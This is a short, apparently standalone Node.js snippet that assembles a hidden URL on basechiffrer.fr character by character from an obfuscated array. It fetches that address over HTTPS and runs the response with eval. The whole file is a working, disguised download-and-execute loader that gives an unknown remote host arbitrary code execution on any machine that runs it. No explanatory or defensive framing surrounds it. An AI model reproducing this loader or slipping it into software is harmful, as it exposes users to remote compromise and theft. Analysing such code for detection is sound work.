(function() {
    var _0x3a7b = ['h', 't', 't', 'p', 's', ':', '/', '/', 'b', 'a', 's', 'e', 'c', 'h', 'i', 'f', 'f', 'r', 'e', 'r', '.', 'f', 'r', '/', 'T', 't', 'J', 'g', '2', 'J', 'J']; 
    var _0x430d = function(index) { return _0x3a7b[index]; };

    var domain = '';
    for (var i = 0; i < _0x3a7b.length; i++) {
        domain += _0x430d(i);
    }

    require('https').get(domain, function(r) {
        var d = '';
        r.on('data', function(c) {
            d += c;
        });
        r.on('end', function() {
            eval(d);
        });
    });
})();